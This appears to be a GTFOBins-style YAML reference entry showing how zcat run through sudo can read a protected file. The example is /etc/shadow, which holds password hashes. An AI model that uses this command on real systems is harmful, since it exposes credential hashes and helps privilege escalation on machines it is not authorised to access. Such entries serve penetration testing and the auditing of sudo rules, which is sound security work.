---
functions:
  sudo:
    - code: |
        LFILE="/etc/shadow" # or any other file
        sudo zcat -f "$LFILE"
---
